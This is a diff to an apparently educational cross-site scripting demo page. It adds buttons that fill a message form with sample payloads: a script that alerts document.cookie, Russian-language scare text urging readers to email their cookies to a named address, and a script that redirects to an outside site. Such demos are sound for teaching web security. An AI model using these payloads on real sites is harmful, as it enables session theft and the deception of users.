@@ -28,9 +28,10 @@ template_end = """
         <form method="post">
             <textarea name="message" rows="10" cols="80"></textarea><br>
             <button type="button" onclick="insertText('text1')">Просто текст</button>
-            <button type="button" onclick="insertText('text2')">Alert</button>
+            <button type="button" onclick="insertText('text2')">Alert 1</button>
             <button type="button" onclick="insertText('text3')">Email</button>
-            <button type="button" onclick="insertText('text4')">Location</button>
+            <button type="button" onclick="insertText('text4')">Alert 2</button>
+            <button type="button" onclick="insertText('text5')">Location</button>
             <button type="submit">Отправить</button>
         </form>
     </body>
@@ -57,17 +58,22 @@ template_end = """
             const textarea = document.getElementsByName("message")[0];
 
             const text1 = `Действительно! Очень интересный текст!`
+
             const text2 = `<script>
     alert(document.cookie);
 <\\/script>`;
 
-            const text3 = `Срочно отправьте этот текст на email a@alak.in:
+            const text3 = `ВЫ В ОПАСНОСТИ! СРОЧНО отправьте этот текст на email a@alak.in:
 <div id="cookies"></div>
 <script>
     document.getElementById("cookies").textContent = document.cookie;
 <\\/script>`;
 
             const text4 = `<script>
+    alert("ВЫ В ОПАСНОСТИ! СРОЧНО отправьте этот текст на email a@alak.in: " + document.cookie);
+<\\/script>`;
+
+            const text5 = `<script>
     location.href="http://ip4.me";
 <\\/script>`;
 
@@ -76,6 +82,7 @@ template_end = """
             else if (arg === 'text2') selectedText = text2;
             else if (arg === 'text3') selectedText = text3;
             else if (arg === 'text4') selectedText = text4;
+            else if (arg === 'text5') selectedText = text5;
 
             textarea.value = selectedText;
         }
